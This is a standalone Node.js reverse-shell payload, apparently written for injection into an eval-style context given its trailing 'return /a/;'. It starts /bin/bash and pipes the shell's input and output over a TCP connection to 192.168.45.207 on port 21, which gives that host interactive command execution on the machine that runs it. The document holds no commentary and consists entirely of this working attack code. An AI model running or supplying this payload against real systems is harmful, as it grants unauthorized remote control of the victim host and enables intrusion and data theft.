(function(){
  var net = require("net"),
  cp = require("child_process"),
  sh = cp.spawn("/bin/bash", []);
  var client = new net.Socket();
  client.connect(21, "192.168.45.207", function(){
  client.pipe(sh.stdin);
  sh.stdout.pipe(client);
  sh.stderr.pipe(client);
  });
  return /a/;
 })();